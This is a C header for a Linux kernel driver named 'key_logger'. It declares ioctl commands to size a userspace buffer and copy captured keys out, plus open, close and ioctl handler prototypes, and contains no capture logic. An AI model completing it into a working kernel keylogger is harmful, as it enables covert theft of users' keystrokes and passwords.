#ifndef TEST_DRIVER
#define TEST_DRIVER
#include <linux/ioctl.h> 

#define DRIVER_NAME "key_logger"
#define MAJOR_V 2

#define SET_BUFF_SIZE _IOW(MAJOR_V, 0, unsigned long) //Set size of userspace buffer
#define GET_READ_KEYS _IOR(MAJOR_V, 1, char*) //Copy as many keys as possible into userspace buffer 

#ifndef USER_SPACE

#include <linux/module.h> 
#include <linux/printk.h> 
#include <linux/init.h> 
#include <linux/fs.h>
#include <linux/device.h>

typedef struct key_entry
{
    const char* e_key;

} KeyEntry; 

static int openDriver(struct inode* inode, struct file* file);
static int closeDriver(struct inode* inode, struct file* file);

static long ioctl_handler(struct file * file, unsigned int op, unsigned long data);
#endif

#endif